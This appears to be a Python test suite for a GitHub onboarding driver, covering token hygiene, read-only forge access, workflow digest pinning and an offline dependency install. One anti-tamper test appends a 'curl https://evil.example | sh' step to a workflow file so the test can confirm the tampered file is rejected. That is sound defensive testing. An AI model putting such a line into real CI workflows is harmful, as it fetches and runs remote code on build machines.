"""Mode-B tests for the production live-forge ApplyDriver (ce-ops#88, Phase 1).

Per ce-ops#44 REAL-shape acceptance, these exercise the live forge legs against forge
responses **captured VERBATIM from the live GitHub REST API** (see
``fixtures/ce88_live_forge/CAPTURE.md`` for the exact ``gh api`` commands + date) — never
invented JSON. Only the network/crypto boundaries are faked (the App-JWT HTTPS transport, the
authenticated-``gh`` subprocess, the clone subprocess, the RS256 signer); the full credential
composition (``app_jwt_gh_runner`` → ``mint_scoped_token`` → ``authenticated_gh_runner`` →
``revoke_scoped_token``) runs for real. The live Mode-A run (real installation token, real
forge reads) is the clean-room VPS rehearsal DoD — done later by the orchestrator, not here.
"""

from __future__ import annotations

import base64
import json
import subprocess
from pathlib import Path
from typing import Any

import pytest
import yaml

from creator_engine_validator import onboard_apply, onboard_apply_live, v3_installer
from creator_engine_validator.forge.github_repo_config import DEFAULT_MAIN_PROTECTION

_FX = Path(__file__).parent / "fixtures" / "ce88_live_forge"
_REPO = "creator-engine/creator-engine"
_MINTED = "ghs_fake_minted_value"  # the value the fake mint transport returns
_BOOTSTRAP_PAT = "ghp_fakeclassicbootstrappatvalue0000000000"  # classic PAT (ghp_ prefix)
_BOOTSTRAP_PAT_FG = "github_pat_11FAKEfinegrainedbootstrappatvalue00000"  # fine-grained PAT (ce-ops#94)


def _schema() -> dict[str, Any]:
    return yaml.safe_load(Path("schemas/install-answers.schema.yaml").read_text(encoding="utf-8"))


def _fx(name: str) -> str:
    return (_FX / name).read_text(encoding="utf-8")


class _ModeBForge:
    """Replays the VERBATIM captured forge JSON and records every (argv, env) for hygiene asserts.

    ``contents`` selects which captured contents envelope the workflow read returns (the
    already-CE ``ce-validate.yml`` for the happy path, or the real ``validate.yml`` whose digest
    drifts — OQ-C). ``protection`` overrides the protection JSON (to drive the OQ-F defer case).
    """

    def __init__(
        self,
        *,
        contents: str | None = None,
        protection: str | None = None,
        user_response: str | None = None,
        contents_by_path: dict[str, str] | None = None,
    ):
        self.repo_json = _fx("repo.json")
        self.protection_json = protection if protection is not None else _fx("protection.json")
        self.contents_json = contents if contents is not None else _fx(
            "contents_ce_validate_yml_already_ce.json"
        )
        # ce-ops#90: path-keyed contents (workflow path -> captured contents JSON). When
        # set, the /contents/ read serves the envelope for the EXACT requested path and a
        # verbatim 404 (workflow_absent shape) for any unlisted path — so a test can model
        # "the legacy validate.yml is present but the canonical ce-validate.yml is absent".
        self.contents_by_path = contents_by_path
        # ce-ops#94: classic capture by default; a fine-grained capture (no X-Oauth-Scopes) is
        # injected by the fine-grained probe test.
        self.user_response = user_response if user_response is not None else _fx(
            "user_response_headers.txt"
        )
        # App-installation coverage (GET /installation/repositories): the standard envelope
        # carrying the VERBATIM-captured repo object — confirms the install covers the repo.
        self.installation_repos = json.dumps(
            {"total_count": 1, "repositories": [json.loads(self.repo_json)]}
        )
        self.calls: list[dict[str, Any]] = []  # {"argv", "env_token"}

    # the app-JWT HTTPS transport (mint POST)
    def transport(self, method: str, url: str, headers: dict[str, str], body: str | None):
        assert headers.get("Authorization", "").startswith("Bearer "), "App auth must be Bearer JWT"
        assert _MINTED not in (body or ""), "the minted value must never be the mint request body"
        return 201, json.dumps(
            {
                "token": _MINTED,
                "expires_at": "2026-06-15T15:00:00Z",
                "permissions": {"metadata": "read", "contents": "read", "administration": "read"},
            }
        )

    # the authenticated-gh subprocess (reads + revoke + bootstrap probe)
    def spawn(self, argv, input_text, env):
        token = env.get("GH_TOKEN")
        self.calls.append({"argv": list(argv), "env_token": token})
        # HYGIENE: the secret rides in GH_TOKEN only — never the argv.
        assert _MINTED not in " ".join(argv)
        assert _BOOTSTRAP_PAT not in " ".join(argv)
        assert _BOOTSTRAP_PAT_FG not in " ".join(argv)
        joined = " ".join(argv)

        def done(rc: int, out: str = "") -> subprocess.CompletedProcess:
            return subprocess.CompletedProcess(list(argv), rc, stdout=out, stderr="")

        if "-X" in argv and "DELETE" in argv and "installation/token" in joined:
            return done(0)  # revoke
        if "-i" in argv and argv[-1] == "user":
            return done(0, self.user_response)  # bootstrap PAT probe
        if "installation/repositories" in joined:
            return done(0, self.installation_repos)  # App-installation coverage
        if "/branches/main/protection" in joined:
            return done(0, self.protection_json)
        if "/contents/" in joined:
            if self.contents_by_path is not None:
                # repos/<repo>/contents/<path>?ref=<branch> → serve the keyed envelope or 404.
                requested = joined.split("/contents/", 1)[1].split("?", 1)[0]
                payload = self.contents_by_path.get(requested)
                if payload is None:
                    return done(1)  # absent → workflow_absent
                return done(0, payload)
            return done(0, self.contents_json)
        if joined.rstrip("?").endswith(f"repos/{_REPO}") or f"repos/{_REPO}" in joined:
            return done(0, self.repo_json)
        return done(1)

    # the clone subprocess
    def git_spawn(self, argv, input_text, env):
        self.calls.append({"argv": list(argv), "env_token": env.get("GH_TOKEN")})
        assert _MINTED not in " ".join(argv), "clone must not carry the token in argv"
        dest = Path(argv[4])  # gh repo clone <repo> <dest> -- ...
        (dest / ".git").mkdir(parents=True, exist_ok=True)
        return subprocess.CompletedProcess(list(argv), 0, stdout="", stderr="")

    def write_argvs(self) -> list[list[str]]:
        """argvs that would MUTATE the forge (a PUT/POST/PATCH/DELETE on a repo path)."""
        out = []
        for c in self.calls:
            argv = c["argv"]
            joined = " ".join(argv)
            if any(m in argv for m in ("PUT", "PATCH", "POST")) or (
                "DELETE" in argv and "installation/token" not in joined
            ):
                out.append(argv)
        return out


def _driver(forge: _ModeBForge) -> onboard_apply_live.LiveForgeApplyDriver:
    config = onboard_apply_live.LiveForgeConfig(
        repo=_REPO,
        installation_id=140271364,
        app_client_id="Iv1.testclient",
        signer=lambda signing_input: b"fake-rs256-signature",
        policy_sha="a" * 64,
        run_id="onboard-live-forge-test",
        transport=forge.transport,
        spawn=forge.spawn,
        git_spawn=forge.git_spawn,
    )
    return onboard_apply_live.LiveForgeApplyDriver(config)


# ---------------------------------------------------------------------------
# Detection — real already-CE signals (repo_exists + verify_workflow@digest + protection)
# ---------------------------------------------------------------------------
def test_already_ce_detection_true_via_real_forge_reads():
    forge = _ModeBForge()
    driver = _driver(forge)
    assert (
        onboard_apply.repo_is_already_ce_governed(
            driver, repo=_REPO, branch="main", schema=_schema()
        )
        is True
    )
    driver.close()
    # the credential composition actually fired: a read carried the minted token in GH_TOKEN.
    assert any(c["env_token"] == _MINTED for c in forge.calls)


def test_repo_exists_true_and_false_fail_closed():
    forge = _ModeBForge()
    assert _driver(forge).repo_exists(_REPO) is True

    class _NotFound(_ModeBForge):
        def spawn(self, argv, input_text, env):
            self.calls.append({"argv": list(argv), "env_token": env.get("GH_TOKEN")})
            return subprocess.CompletedProcess(list(argv), 1, stdout="", stderr="Not Found")

    assert _driver(_NotFound()).repo_exists(_REPO) is False


def test_verify_workflow_exact_digest_match_true():
    forge = _ModeBForge()  # already-CE ce-validate.yml fixture (content == CE_WORKFLOW_CONTENT)
    result = _driver(forge).verify_workflow(
        repo=_REPO,
        branch="main",
        path=onboard_apply.CE_WORKFLOW_PATH,
        digest=onboard_apply.CE_WORKFLOW_SHA256,
    )
    assert result["ok"] is True
    assert result["sha256"] == onboard_apply.CE_WORKFLOW_SHA256


def test_verify_workflow_digest_mismatch_distinct_diagnostic():
    # OQ-C: a present-but-byte-drifted workflow (the CE repo's real validate.yml) yields a
    # DISTINCT workflow_digest_mismatch reason — not a blanket brownfield refuse.
    forge = _ModeBForge(contents=_fx("contents_validate_yml.json"))
    result = _driver(forge).verify_workflow(
        repo=_REPO,
        branch="main",
        path=onboard_apply.CE_WORKFLOW_PATH,
        digest=onboard_apply.CE_WORKFLOW_SHA256,
    )
    assert result["ok"] is False
    assert result["reason"] == "workflow_digest_mismatch"
    assert result["expected"] == onboard_apply.CE_WORKFLOW_SHA256
    assert result["actual"] and result["actual"] != onboard_apply.CE_WORKFLOW_SHA256


def test_verify_branch_protection_floor_present_true():
    forge = _ModeBForge()
    policy = DEFAULT_MAIN_PROTECTION.with_contexts(("Validate governance artifacts",))
    result = _driver(forge).verify_branch_protection(repo=_REPO, branch="main", policy=policy)
    assert result["ok"] is True
    assert "Validate governance artifacts" in result["contexts"]


def test_existing_branch_protection_contexts_reads_live():
    forge = _ModeBForge()
    contexts = _driver(forge).existing_branch_protection_contexts(repo=_REPO, branch="main")
    assert "Validate governance artifacts" in contexts


# ---------------------------------------------------------------------------
# OQ-F — defer-not-mutate: configure_branch_protection is verify-first, ZERO forge writes
# ---------------------------------------------------------------------------
def test_configure_branch_protection_is_noop_with_zero_forge_writes():
    forge = _ModeBForge()
    policy = DEFAULT_MAIN_PROTECTION.with_contexts(("Validate governance artifacts",))
    result = _driver(forge).configure_branch_protection(
        repo=_REPO, branch="main", policy=policy, token=_BOOTSTRAP_PAT
    )
    assert result["ok"] is True
    assert result["already"] is True and result["mutated"] is False
    # the load-bearing OQ-F guarantee: not a single forge-mutating call was issued.
    assert forge.write_argvs() == []


def test_configure_branch_protection_defers_when_ce_check_missing():
    # A repo missing the CE floor check is NOT fully already-CE → defer, never mutate.
    weak_protection = json.dumps(
        {"required_status_checks": {"strict": True, "contexts": ["Some Other CI"]}}
    )
    forge = _ModeBForge(protection=weak_protection)
    policy = DEFAULT_MAIN_PROTECTION.with_contexts(("Validate governance artifacts",))
    result = _driver(forge).configure_branch_protection(
        repo=_REPO, branch="main", policy=policy, token=_BOOTSTRAP_PAT
    )
    assert result["ok"] is False
    assert result["reason"] == "branch_protection_mutation_deferred"
    assert "Validate governance artifacts" in result["would_add"]
    assert forge.write_argvs() == []  # still zero writes


# ---------------------------------------------------------------------------
# Bootstrap-token probe + workspace checkout (plain-join apply legs)
# ---------------------------------------------------------------------------
def test_probe_bootstrap_token_maps_oauth_scopes_to_ce_permissions():
    forge = _ModeBForge()
    result = _driver(forge).probe_bootstrap_token(
        token=_BOOTSTRAP_PAT, repo=_REPO, org_create_needed=False
    )
    assert result["ok"] is True
    assert result["login"] == "chmod735"
    assert result["token_type"] == "classic"
    # the captured X-Oauth-Scopes (… repo, workflow) map to the full required bootstrap set.
    assert set(v3_installer.REQUIRED_BOOTSTRAP_SCOPES).issubset(set(result["scopes"]))


def test_probe_bootstrap_token_finegrained_passes_without_oauth_scopes():
    # ce-ops#94: a fine-grained PAT emits NO X-Oauth-Scopes. The probe must classify it by prefix,
    # report a valid identity, and NOT fabricate an empty (= "missing everything") scope set.
    # Fixture = VERBATIM capture from ce-dev-3's real fine-grained PAT (see CAPTURE.md).
    forge = _ModeBForge(user_response=_fx("user_response_finegrained.txt"))
    result = _driver(forge).probe_bootstrap_token(
        token=_BOOTSTRAP_PAT_FG, repo=_REPO, org_create_needed=False
    )
    assert result["ok"] is True
    assert result["token_type"] == "fine_grained"
    assert result["login"] == "ce-dev-3"
    assert "scopes" not in result  # no classic-scope set is invented for a fine-grained token


def test_detect_token_type_by_prefix_and_header_fallback():
    detect = onboard_apply_live._detect_token_type
    assert detect(_BOOTSTRAP_PAT_FG, oauth_header_present=False) == "fine_grained"
    assert detect("ghp_classic", oauth_header_present=False) == "classic"
    assert detect("gho_oauth", oauth_header_present=False) == "classic"
    assert detect("ghu_appuser", oauth_header_present=False) == "classic"
    # unknown prefix but the classic X-Oauth-Scopes header IS present -> classic (corroborating)
    assert detect("legacy-opaque-value", oauth_header_present=True) == "classic"
    # unknown prefix AND no classic header -> fail-closed unknown
    assert detect("legacy-opaque-value", oauth_header_present=False) == "unknown"


def test_checkout_workspace_clones_locally_and_verifies(tmp_path):
    forge = _ModeBForge()
    driver = _driver(forge)
    result = driver.checkout_workspace(repo=_REPO, branch="main", workspace_root=tmp_path)
    assert result["ok"] is True and result["created"] is True
    path = Path(result["path"])
    assert (path / ".git").exists()
    assert driver.verify_checkout(repo=_REPO, branch="main", path=path)["ok"] is True
    # idempotent: a second checkout is a no-op (already present)
    again = driver.checkout_workspace(repo=_REPO, branch="main", workspace_root=tmp_path)
    assert again["already"] is True


# ---------------------------------------------------------------------------
# Token hygiene — mint least-privilege, never leak the value, revoke after
# ---------------------------------------------------------------------------
def test_token_is_revoked_on_close_authenticated_as_itself():
    forge = _ModeBForge()
    driver = _driver(forge)
    driver.repo_exists(_REPO)  # forces the lazy mint
    driver.close()
    revoke = [
        c for c in forge.calls
        if "DELETE" in c["argv"] and "installation/token" in " ".join(c["argv"])
    ]
    assert len(revoke) == 1
    assert revoke[0]["env_token"] == _MINTED  # revoke is authenticated AS the token


def test_token_value_never_appears_in_argv_or_driver_repr():
    forge = _ModeBForge()
    driver = _driver(forge)
    onboard_apply.repo_is_already_ce_governed(driver, repo=_REPO, branch="main", schema=_schema())
    driver.checkout_workspace(repo=_REPO, branch="main", workspace_root=Path("/tmp/ce88_hygiene"))
    driver.close()
    for call in forge.calls:
        assert _MINTED not in " ".join(call["argv"])
    assert _MINTED not in repr(driver)


def test_verify_app_installation_coverage_get_confirms_repo_no_mutation():
    # ce-ops#88 amendment: read-only coverage GET — the installation covers the repo (the
    # captured repo object appears in /installation/repositories). No install click, no write.
    forge = _ModeBForge()
    result = _driver(forge).verify_app_installation(
        installation_id=140271364, repo=_REPO, bot_identity="creator-engine[bot]"
    )
    assert result["ok"] is True
    assert result["covered"] is True
    assert result["installation_id"] == 140271364
    assert forge.write_argvs() == []  # pure read


def test_verify_app_installation_fails_closed_when_repo_not_covered():
    not_covering = json.dumps({"total_count": 0, "repositories": []})

    class _NoCover(_ModeBForge):
        def __init__(self):
            super().__init__()
            self.installation_repos = not_covering

    result = _driver(_NoCover()).verify_app_installation(
        installation_id=140271364, repo=_REPO, bot_identity="creator-engine[bot]"
    )
    assert result["ok"] is False
    assert result["reason"] == "app_installation_repo_not_covered"


# ---------------------------------------------------------------------------
# OQ-D — fail-closed selection factory (default OFF; explicit env flag; creds must resolve)
# ---------------------------------------------------------------------------
def _merged() -> "v3_installer.MergeResult":
    github = {"mode": "existing", "repo": _REPO, "app": {"installation_id": 140271364}}
    answers = {"answers_version": 1, "github": github}
    return v3_installer.merge_answers(_schema(), answers=answers, detected={})


def _creds_env(pem: Path, *, live: bool = True) -> dict[str, str]:
    env = {"CE_FORGE_APP_CLIENT_ID": "Iv1.x", "CE_FORGE_APP_PEM": str(pem)}
    if live:
        env["CE_FORGE_LIVE_FORGE"] = "1"
    return env


def test_live_forge_select_off_by_default_returns_base_unchanged():
    base = onboard_apply.ApplyDriver()
    selected = onboard_apply_live.live_forge_select(
        base, merged=_merged(), policy_sha="a" * 64, env={}
    )
    assert selected is base  # pass-through → the FakeDriver monkeypatch is untouched


def test_live_forge_select_rejects_autodetect_without_flag(tmp_path):
    # creds present in env but CE_FORGE_LIVE_FORGE unset → autodetect REJECTED → base.
    pem = tmp_path / "ce-app.pem"
    pem.write_text("k", encoding="utf-8")
    base = onboard_apply.ApplyDriver()
    selected = onboard_apply_live.live_forge_select(
        base, merged=_merged(), policy_sha="a" * 64, env=_creds_env(pem, live=False)
    )
    assert selected is base


def test_live_forge_select_flag_on_but_creds_absent_fails_closed():
    base = onboard_apply.ApplyDriver()
    selected = onboard_apply_live.live_forge_select(
        base, merged=_merged(), policy_sha="a" * 64, env={"CE_FORGE_LIVE_FORGE": "1"}
    )
    assert selected is base  # fail-closed: never a half-live driver


def test_live_forge_select_on_with_resolved_creds_returns_live(tmp_path):
    pem = tmp_path / "ce-app.pem"
    pem.write_text("-----BEGIN PRIVATE KEY-----\nx\n-----END PRIVATE KEY-----\n", encoding="utf-8")
    selected = onboard_apply_live.live_forge_select(
        onboard_apply.ApplyDriver(), merged=_merged(), policy_sha="a" * 64, env=_creds_env(pem)
    )
    assert isinstance(selected, onboard_apply_live.LiveForgeApplyDriver)


def test_live_forge_select_accepts_truthy_flag_spellings(tmp_path):
    pem = tmp_path / "ce-app.pem"
    pem.write_text("k", encoding="utf-8")
    for spelling in ("1", "true", "TRUE", "yes", "on"):
        env = {"CE_FORGE_APP_CLIENT_ID": "Iv1.x", "CE_FORGE_APP_PEM": str(pem), "CE_FORGE_LIVE_FORGE": spelling}
        selected = onboard_apply_live.live_forge_select(
            onboard_apply.ApplyDriver(), merged=_merged(), policy_sha="a" * 64, env=env
        )
        assert isinstance(selected, onboard_apply_live.LiveForgeApplyDriver), spelling


# ---------------------------------------------------------------------------
# THE HEADLINE (#44 DoD): a full plain-join `--apply` COMPLETES — every leg converges,
# github_app_install verifies coverage (no Phase-2 stub failure), refused==failed==0
# (⇒ `onboard --apply` exits 0), NO e2_brownfield_seam_unavailable — with token hygiene.
# ---------------------------------------------------------------------------
class _HostFakedLiveDriver(onboard_apply_live.LiveForgeApplyDriver):
    """Live forge legs (real, Mode-B JSON) over FAKED host legs — so a full apply_onboard
    reaches and exercises the forge legs without real host provisioning/cli/smoke (those host
    legs are inherited from the base driver and covered by test_onboard_apply's FakeDriver)."""

    def probe_tool(self, name): return True
    def verify_tool(self, name): return True
    def install_dependencies(self, tools, *, sudo_tools, userspace_tools):
        return {"ok": True, "installed": []}
    def verify_runtime(self, *, state_root, workspace_root, provider, backend=v3_installer.DEFAULT_ISOLATION_BACKEND):
        return {"ok": True, "backend": backend, "runsc": True, "proxy": True, "provider_transport": True}
    def expose_cli(self, *, state_root, command, via):
        return {"ok": True, "created": True, "path": str(state_root / "onboard" / "bin" / command)}
    def verify_cli(self, *, state_root, command):
        return {"ok": True, "command": command}
    def resolve_secret(self, ref):
        return _BOOTSTRAP_PAT
    def run_first_project_smoke(self, *, state_root, workspace_path, scope_id, target_repo, spawn_smoke):
        return {"ok": True, "scope_path": str(state_root / "scopes" / f"{scope_id}.scope.yaml"),
                "drive": {"ok": True}, "spawn": {"attempted": False, "ok": False, "reason": "n/a"}, "already": False}


def _live_apply(tmp_path: Path, forge: _ModeBForge):
    config = onboard_apply_live.LiveForgeConfig(
        repo=_REPO, installation_id=140271364, app_client_id="Iv1.testclient",
        signer=lambda b: b"fake-rs256-signature", policy_sha="a" * 64, run_id="headline",
        transport=forge.transport, spawn=forge.spawn, git_spawn=forge.git_spawn,
    )
    driver = _HostFakedLiveDriver(config)
    canonical = (
        "kind: ce-install-spec\nschema_version: 1\nsignature:\n  key_id: ce-root-v1\n"
        "  algo: ssh-ed25519\n  namespace: ce-spec-v1\n  value: VALUE\n  content_sha256: DIGEST\n"
        "steps:\n  - verify\n  - apply\n"
    )
    digest = v3_installer.content_digest(v3_installer.canonical_spec_bytes(canonical))
    spec = canonical.replace("VALUE", "c2ln").replace("DIGEST", digest).encode("utf-8")
    answers = {
        "answers_version": 1,
        "host": {"sudo_grant": ["git", "python", "runsc", "proxy"], "userspace_install": True,
                 "workspace_root": str(tmp_path / "ws")},
        "provider": {"harness": "codex"},
        "github": {"mode": "existing", "repo": _REPO, "bootstrap_token": "env://CE_BOOTSTRAP",
                   "app": {"kind": "shared", "installation_id": 140271364},
                   "actions": {"install_validate_workflow": True}, "protections": "reference",
                   "reviewer": "human-reviewer"},
        "pilot": {"target_repo": _REPO},
    }
    request = onboard_apply.ApplyRequest(
        spec_bytes=spec, schema=_schema(), answers=answers,
        answers_sha256=v3_installer.content_digest(b"x"), state_root=tmp_path / "state",
        dependency_probe={t: True for t in v3_installer.REQUIRED_DEPENDENCIES}, non_interactive=True,
    )
    summary = onboard_apply.apply_onboard(request, verifier=lambda *a: True, driver=driver)
    driver.close()
    return summary, driver


def test_plain_join_apply_completes_exit_zero_no_brownfield_seam(tmp_path):
    forge = _ModeBForge()  # the already-CE repo (real captures: repo + protection + ce-validate digest)
    # detection True via the live reads (the first DoD signal)
    assert onboard_apply.repo_is_already_ce_governed(
        _driver(forge), repo=_REPO, branch="main", schema=_schema()
    ) is True

    summary, driver = _live_apply(tmp_path, forge)
    # plain-join COMPLETES: zero refused, zero failed ⇒ `onboard --apply` exit code 0.
    assert summary["refused"] == 0, summary["legs"]
    assert summary["failed"] == 0, summary["legs"]
    assert summary["brownfield_deferred"] == 0
    assert summary["repos_already_satisfied"] == 1
    # github_app_install converged on the read-only coverage GET (not the Phase-2 stub)
    appleg = next(l for l in summary["legs"] if l["id"] == "github_app_install")
    assert appleg["status"] in {"applied", "already_satisfied"}
    assert appleg["verification"]["covered"] is True
    # plain-join legs ran read-only / no-op: NO e2_brownfield_seam_unavailable anywhere
    assert all("brownfield" not in (l.get("detail") or "") for l in summary["legs"])
    # OQ-F: zero forge WRITES across the whole apply (reads + a local clone only)
    assert forge.write_argvs() == []


def test_plain_join_apply_token_hygiene_minted_and_revoked(tmp_path):
    forge = _ModeBForge()
    _summary, _driver_obj = _live_apply(tmp_path, forge)
    # the minted token authenticated the reads (GH_TOKEN env) and never hit any argv
    assert any(c["env_token"] == _MINTED for c in forge.calls)
    for c in forge.calls:
        assert _MINTED not in " ".join(c["argv"])
    # and it was revoked after the legs finished
    assert any("DELETE" in c["argv"] and "installation/token" in " ".join(c["argv"]) for c in forge.calls)


# ---------------------------------------------------------------------------
# ce-ops#90 — LOOSEN the already-CE workflow detector (loosen ≠ weaken). Detection
# now keys on a GOVERNANCE SIGNAL — the repo's CI invokes the pinned CE validator —
# accepting the KNOWN SET of CE workflow identities (the canonical ``ce-validate.yml``
# AND the flagship's legacy ``validate.yml``) by EXACT byte-pin, while a tampered /
# non-CE / absent workflow is still rejected (the byte-level anti-tamper is preserved).
# REAL-shape: the legacy capture is the flagship's VERBATIM ``validate.yml``.
# ---------------------------------------------------------------------------
_CE_PATH = onboard_apply.CE_WORKFLOW_PATH
_LEGACY_PATH = onboard_apply.LEGACY_CE_WORKFLOW_PATH


def _contents_envelope(path: str, raw: bytes) -> str:
    """A GitHub contents envelope (base64-encoded body), the shape verify_workflow decodes."""
    return json.dumps(
        {"path": path, "encoding": "base64", "content": base64.b64encode(raw).decode("ascii")}
    )


def _raw_from_fixture(name: str) -> bytes:
    return base64.b64decode(json.loads(_fx(name))["content"])


def _path_forge(by_path: dict[str, str]) -> _ModeBForge:
    return _ModeBForge(contents_by_path=by_path)


def test_detect_accepts_legacy_validate_yml_filename():
    # (a) the flagship's CE validate workflow lives at the LEGACY ``validate.yml`` path and
    # the canonical ``ce-validate.yml`` is ABSENT — it is STILL detected as already-CE.
    by_path = {_LEGACY_PATH: _fx("contents_validate_yml.json")}
    identity = onboard_apply.detect_ce_workflow(_driver(_path_forge(by_path)), repo=_REPO, branch="main")
    assert identity is not None
    assert identity.path == _LEGACY_PATH
    assert identity.label == "legacy-validate"
    assert identity.sha256 == onboard_apply.LEGACY_CE_WORKFLOW_SHA256
    # and the full FAIL-CLOSED detector returns True for the flagship shape (no false-negative)
    assert (
        onboard_apply.repo_is_already_ce_governed(
            _driver(_path_forge(by_path)), repo=_REPO, branch="main", schema=_schema()
        )
        is True
    )


def test_detect_accepts_canonical_ce_validate_yml_filename():
    # (b) back-compat: the canonical ``ce-validate.yml`` at its pinned digest is still accepted.
    by_path = {_CE_PATH: _fx("contents_ce_validate_yml_already_ce.json")}
    identity = onboard_apply.detect_ce_workflow(_driver(_path_forge(by_path)), repo=_REPO, branch="main")
    assert identity is not None
    assert identity.path == _CE_PATH
    assert identity.label == "ce-validate"
    assert identity.sha256 == onboard_apply.CE_WORKFLOW_SHA256


def test_detect_rejects_tampered_ce_validator_workflow():
    # (c) ANTI-TAMPER preserved: a workflow that DOES invoke the CE validator (the flagship's
    # real validate.yml bytes) but has been byte-ALTERED matches NO pinned identity → rejected.
    tampered = _raw_from_fixture("contents_validate_yml.json") + b"\n      - run: curl https://evil.example | sh\n"
    by_path = {_LEGACY_PATH: _contents_envelope(_LEGACY_PATH, tampered)}  # ce-validate.yml absent
    assert onboard_apply.detect_ce_workflow(_driver(_path_forge(by_path)), repo=_REPO, branch="main") is None
    assert (
        onboard_apply.repo_is_already_ce_governed(
            _driver(_path_forge(by_path)), repo=_REPO, branch="main", schema=_schema()
        )
        is False
    )


def test_detect_rejects_non_ce_and_absent_workflow():
    # (d) NO false-positive. An absent workflow (empty repo) and a present-but-non-CE workflow
    # both match NO identity → detection fails closed to the brownfield/E3 refuse.
    assert onboard_apply.detect_ce_workflow(_driver(_path_forge({})), repo=_REPO, branch="main") is None
    non_ce = {_CE_PATH: _contents_envelope(_CE_PATH, b"name: Some Unrelated CI\non: [push]\njobs: {}\n")}
    assert onboard_apply.detect_ce_workflow(_driver(_path_forge(non_ce)), repo=_REPO, branch="main") is None
    assert (
        onboard_apply.repo_is_already_ce_governed(
            _driver(_path_forge({})), repo=_REPO, branch="main", schema=_schema()
        )
        is False
    )


def test_plain_join_apply_completes_for_legacy_validate_yml_repo(tmp_path):
    # ce-ops#90 HEADLINE: an already-CE repo whose CE validate workflow uses the LEGACY
    # ``validate.yml`` filename now COMPLETES `onboard --apply` (was: dead-ended at
    # e2_brownfield_seam_unavailable). Proves the workflow-VERIFY leg was loosened too —
    # it matches the legacy identity verify-only, never overwriting the live file.
    by_path = {_LEGACY_PATH: _fx("contents_validate_yml.json")}  # canonical ce-validate.yml ABSENT
    assert (
        onboard_apply.repo_is_already_ce_governed(
            _driver(_path_forge(by_path)), repo=_REPO, branch="main", schema=_schema()
        )
        is True
    )
    forge = _path_forge(by_path)
    summary, _driver_obj = _live_apply(tmp_path, forge)
    assert summary["refused"] == 0, summary["legs"]
    assert summary["failed"] == 0, summary["legs"]
    assert summary["brownfield_deferred"] == 0
    assert summary["repos_already_satisfied"] == 1
    wf = next(l for l in summary["legs"] if l["id"] == "github_workflow_install")
    assert wf["status"] == "already_satisfied"
    assert wf["verification"]["path"] == _LEGACY_PATH
    assert wf["verification"]["identity"] == "legacy-validate"
    # NO e2_brownfield_seam_unavailable anywhere, and OQ-F holds: zero forge WRITES.
    assert all("brownfield" not in (l.get("detail") or "") for l in summary["legs"])
    assert forge.write_argvs() == []


# ---------------------------------------------------------------------------
# ce-ops#90 (design A, Operator-ratified) — 2nd live-forge driver gap (dev-3 dogfood).
# install_dependencies fetches the pinned userspace wheel (uv) from CE's OWN mirror
# (docs/downloads/0.2.0/, NOT astral.sh / a live index), sha256-verifies it against the
# in-code pin (bound to the signed required_wheels entry), then installs OFFLINE via
# `pip --no-index --find-links`. wait_for_app_installation is a read-only already-installed
# detect. All tests are OFFLINE: injected mirror_fetch + pip_spawn → ZERO network / pip.
# ---------------------------------------------------------------------------
_MIRROR_DIR = Path(__file__).resolve().parents[3] / "docs" / "downloads" / "0.2.0"
_UV_PIN = onboard_apply_live.MIRROR_USERSPACE_WHEELS["uv"]
_UV_BYTES = (_MIRROR_DIR / _UV_PIN.filename).read_bytes()


def _deps_driver(*, fetch_bytes: bytes | None = _UV_BYTES, fetch_exc: bool = False,
                 pip_rc: int = 0, verify: bool = True):
    """A live driver wired ONLY for install_dependencies: injected mirror_fetch + pip spawn."""
    calls: dict[str, list] = {"fetch": [], "pip": []}

    def mirror_fetch(url):
        calls["fetch"].append(url)
        if fetch_exc:
            raise RuntimeError("simulated network failure")
        return fetch_bytes

    def pip_spawn(argv):
        calls["pip"].append(list(argv))
        return subprocess.CompletedProcess(list(argv), pip_rc)

    cfg = onboard_apply_live.LiveForgeConfig(
        repo=_REPO, installation_id=140271364, app_client_id="Iv1.testclient",
        signer=lambda b: b"fake-rs256-signature", policy_sha="a" * 64, run_id="deps-test",
        mirror_fetch=mirror_fetch, pip_spawn=pip_spawn,
    )
    driver = onboard_apply_live.LiveForgeApplyDriver(cfg)
    driver.verify_tool = lambda name: verify  # control the post-install verify deterministically
    return driver, calls


# -- install_dependencies: mirror-fetch success + fail-closed paths -----------
def test_install_dependencies_fetches_uv_from_mirror_and_installs_offline():
    driver, calls = _deps_driver()
    result = driver.install_dependencies(["uv"], sudo_tools=[], userspace_tools=["uv"])
    assert result == {"ok": True, "installed": ["uv"]}
    # fetched the pinned wheel from CE's mirror (NOT astral/PyPI) ...
    assert calls["fetch"] == [_UV_PIN.url]
    assert "creator-engine.dev/downloads/0.2.0/" in _UV_PIN.url
    assert "astral" not in _UV_PIN.url
    # ... and installed it OFFLINE from a local find-links dir.
    assert len(calls["pip"]) == 1
    argv = calls["pip"][0]
    assert "--no-index" in argv and "--find-links" in argv and argv[-1] == "uv"
    assert all("astral" not in a and "pypi" not in a.lower() for a in argv)


def test_install_dependencies_fails_closed_on_fetched_sha256_mismatch():
    # ANTI-TAMPER: a fetched wheel whose bytes drift from the signed pin is REFUSED, no install.
    driver, calls = _deps_driver(fetch_bytes=b"not the pinned uv wheel bytes")
    result = driver.install_dependencies(["uv"], sudo_tools=[], userspace_tools=["uv"])
    assert result["ok"] is False
    assert result["reason"] == "userspace_wheel_sha256_mismatch"
    assert result["expected"] == _UV_PIN.sha256 and result["actual"] != _UV_PIN.sha256
    assert calls["pip"] == []  # the sha gate runs BEFORE any pip install


def test_install_dependencies_fails_closed_on_fetch_failure():
    driver, calls = _deps_driver(fetch_exc=True)
    result = driver.install_dependencies(["uv"], sudo_tools=[], userspace_tools=["uv"])
    assert result["ok"] is False
    assert result["reason"] == "userspace_wheel_fetch_failed"
    assert calls["pip"] == []


def test_install_dependencies_empty_is_noop():
    driver, calls = _deps_driver()
    assert driver.install_dependencies([], sudo_tools=[], userspace_tools=[]) == {"ok": True, "installed": []}
    assert calls["fetch"] == [] and calls["pip"] == []


def test_install_dependencies_refuses_sudo_tools_no_host_installer():
    driver, calls = _deps_driver()
    result = driver.install_dependencies(["runsc"], sudo_tools=["runsc"], userspace_tools=[])
    assert result["ok"] is False
    assert result["reason"] == "no_host_package_installer_configured"
    assert result["manual_rollback_required"] is True
    assert result["package_names"] == ["runsc"]
    assert calls["fetch"] == [] and calls["pip"] == []  # no fetch/pip on the sudo path


def test_install_dependencies_fails_closed_on_pip_failure():
    driver, calls = _deps_driver(pip_rc=1)
    result = driver.install_dependencies(["uv"], sudo_tools=[], userspace_tools=["uv"])
    assert result["ok"] is False
    assert result["reason"] == "userspace_install_failed"
